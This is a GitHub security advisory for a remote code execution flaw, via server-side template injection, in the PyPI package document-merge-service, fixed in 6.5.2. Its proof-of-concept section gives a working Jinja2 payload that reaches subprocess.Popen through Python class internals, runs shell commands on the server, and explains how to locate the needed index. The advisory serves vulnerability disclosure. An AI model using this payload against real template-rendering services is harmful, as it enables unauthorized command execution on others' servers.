# [H] document-merge-service vulnerable to Remote Code Execution via Server-Side Template Injection

## Summary
Severity: High
Advisory: GHSA-v5gf-r78h-55q6
CVE: CVE-2024-37301
CWE: CWE-1336
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-06-11
Source: https://github.com/advisories/GHSA-v5gf-r78h-55q6
Type: github-advisory

## Affected
- PyPI: `document-merge-service` — affected >=0 <6.5.2

## Details
### Impact
_What kind of vulnerability is it? Who is impacted?_

A remote code execution (RCE) via server-side template injection (SSTI) allows for user supplied code to be executed in the server's context where it is executed as the document-merge-server user with the UID 901 thus giving an attacker considerable control over the container.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

It has been patched in v6.5.2

### References
_Are there any links users can visit to find out more?_

- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

### POC

Add the following to a document, upload and render it:

```jinja2
{% if PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202] %} 
ls -a: {{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202]("ls -a", shell=True, stdout=-1).communicate()[0].strip() }}

whoami: {{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202]("whoami", shell=True, stdout=-1).communicate()[0].strip() }}

uname -a:
{{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202]("uname -a", shell=True, stdout=-1).communicate()[0].strip() }}

{% endif %}
```

The index might be different, so to debug this first render a template with `{{ PLACEHOLDER.__class__.__mro__[1].__subclasses__() }}` and then get the index of `subprocess.Popen` and replace 202 with that.

![image](https://github.com/adfinis/document-merge-service/assets/110528300/0a1dfcff-2eba-40f1-af9c-08c8ec2bc0a1)

## References
- https://github.com/adfinis/document-merge-service/security/advisories/GHSA-v5gf-r78h-55q6
- https://nvd.nist.gov/vuln/detail/CVE-2024-37301
- https://github.com/adfinis/document-merge-service/commit/a1edd39d33d1bdf75c31ea01c317547be90ca074
- https://github.com/adfinis/document-merge-service
